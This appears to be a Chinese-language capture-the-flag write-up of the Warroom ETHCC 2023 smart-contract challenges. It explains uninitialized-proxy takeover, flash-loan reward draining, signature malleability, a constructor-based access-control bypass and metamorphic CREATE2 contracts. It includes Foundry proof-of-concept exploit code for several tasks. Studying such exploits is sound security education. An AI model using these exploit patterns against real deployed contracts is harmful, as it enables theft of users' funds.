## Warroom ETHCC 2023

### Task 1 - Proxy capture 15 points
[題目](https://github.com/spalen0/warroom-ethcc-2023/tree/master/src/proxy): 

知識點:
-  合約未初始化
-  可更新合約 upgradeable contract

解題:
- 要先初始化拿到 owner
- 把自己加入白名單
- 提出合約上的 balance
- 更新合約到新合約, 其他人就無法初始化

[POC](https://github.com/spalen0/warroom-ethcc-2023/blob/master/test/proxy/Proxy.t.sol)
```
// attacker can call initialize
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call{value: 0.1 ether}(
            abi.encodeWithSignature("initialize(address)", address(0))
        );
        assertTrue(validResponse);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        owner = abi.decode(returnedData, (address));
        assertEq(owner, attacker);

// cannot update without whitelisting
        vm.prank(attacker);
        vm.expectRevert(bytes("!whitelisted"));
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(0))
        );

        // whitelist owner
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("whitelistUser(address)", attacker)
        );
        
        // cannot update without withdrawing funds
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("withdraw(uint256)", 2)
        );

        // upgrade proxy
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(takeOwnership))
        );
        assertTrue(validResponse);
```


### Task 2 - Flash loan 25 points
[題目](https://github.com/spalen0/warroom-ethcc-2023/tree/master/test/flashloan): 

知識點:
-  Flashloan

解題:
- 只要totalLoan大於10k 就可以removeLoan.
- 透過aave  flashloan 會自己還款, 不需要另外寫 transfer

[POC](https://github.com/spalen0/warroom-ethcc-2023/blob/master/test/flashloan/Loan.t.sol)
```
        AttackLoan attackLoan = new AttackLoan(address(loan));
        deal(address(DAI), address(attackLoan), minFlashLoan / 1e3);

        vm.prank(attacker);
        iPool.flashLoanSimple(address(attackLoan), address(DAI), minFlashLoan, "", 0);

---
Attack contract
function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(POOL), "!pool");
        IERC20(asset).approve(address(POOL), amount + premium);

        console.log("Sending to loan contract");  
IERC20(asset).transfer(address(loan), amount + premium);
				
        console.log("Calling flash loan on loan contract");
        POOL.flashLoanSimple(address(loan), asset, amount, "", 0);

        // take all rewards
        console.log("Taking all rewards");
        console.log("Initator: %s", initiator);
        uint256 rewardBalance = IERC20(loan.rewardToken()).balanceOf(address(loan));
        loan.removeLoan(loan.rewardToken(), rewardBalance);
        console.log("Sending rewards to initiator: %d", rewardBalance);
        IERC20(loan.rewardToken()).transfer(initiator, rewardBalance);
        // withdraw send amount
        console.log("Withdraw asset from loan contract");
        loan.removeLoan(asset, amount);

        console.log("Should have enough to repay flash loan");
        require(IERC20(asset).balanceOf(address(this)) >= amount + premium, "!payout");
        // @note he funds will be automatically pulled at the conclusion of your operation.
        return true;
    }
}
```

### Task 3 - Signature malleability 30 points
[題目](https://github.com/spalen0/warroom-ethcc-2023/tree/master/src/signature): 

知識點:
-  Signature malleability 


解題:
- 透過 flip s技巧產生不同signature 但會得到相同 signer. 
- 修補: 使用 openzeppelin's library to prevent malleability attacks and recover to zero issues 和加上 nonce

[POC](https://github.com/spalen0/warroom-ethcc-2023/blob/master/test/signature/WhitelistedRewards.t.sol)
```
function testReuseSignature() public {
        uint256 whitelistedAmount = amount / 2;
        bytes32 digest = keccak256(abi.encodePacked(whitelistedAmount));
        uint256 pk = 22;
        address signer = vm.addr(pk);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);

        vm.prank(signer);
        rewards.claim(whitelisted, whitelistedAmount, v, r, s);
        assertEq(token.balanceOf(whitelisted), whitelistedAmount);

        // verify that the same signature cannot be used again
        vm.expectRevert(bytes("used"));
        rewards.claim(whitelisted, whitelistedAmount, v, r, s);

        // The following is math magic to invert the signature and create a valid one
        // flip s
        bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));

        // invert v
        uint8 v2;
        require(v == 27 || v == 28, "invalid v");
        v2 = v == 27 ? 28 : 27;

        vm.prank(user);
        rewards.claim(user, whitelistedAmount, v2, r, s2);
        assertEq(token.balanceOf(user), whitelistedAmount);
    }
```

### Task 4 - Access Control 35 points
[題目](https://github.com/spalen0/warroom-ethcc-2023/tree/master/src/accesscontrol): 


解題:
- 這個任務包含兩個合約，RewardsBox和AccessControl。AccessControl是一個特殊的存取控制器，並且提供了添加所有者的方式。預設的所有者是vitalik.eth和一個隨機生成的地址。即使是部署者也無法添加新的所有者。RewardsBox非常簡單，並且有一個claim(address accessController, uint256 amount)函數，該函數會檢查所提供的accessController，以查看msg.sender是否被授權，如果是，則處理amount的獎勵代幣。
- RewardsBox通過檢查您所提供控制器的代碼哈希與RewardsBox初始化時內置的代碼哈希是否相符，來強制要求您提供正確的AccessControl合約作為控制器。
- 這裡的問題在於，在以太坊虛擬機(EVM)中部署合約時，可以在構造函數中執行任意程式碼，而該程式碼後來不會反映在已部署的合約程式碼中。因此，攻擊者可以部署一個新的合約，在構造函數中將自己添加到擁有者映射(mapping)中，然後將部署的程式碼設置為正確的 AccessControl 合約

要透過accessController這個檢查, 因為沒有限制來源所以可以自己建立一個accessController.

用一樣的code部署但是要把ownerr加上自己.

[POC](https://github.com/spalen0/warroom-ethcc-2023/blob/master/test/accesscontrol/AccessControl.t.sol)

### Bonus Task - Metamorphic 10 points
[題目](https://github.com/spalen0/warroom-ethcc-2023/tree/master/src/metamorphic): 


解題:
- [Deploy Different Contracts at the Same Address ](https://solidity-by-example.org/hacks/deploy-different-contracts-same-address/)- Metamorphic 合約 可更新 用CREATE2 搭配CREATE 原地換Code
- salt一樣但 bytecode 可以不一樣~  部屬出來的地址一樣.


[POC](https://github.com/spalen0/warroom-ethcc-2023/blob/master/test/metamorphic/MultiplerRug.t.sol)
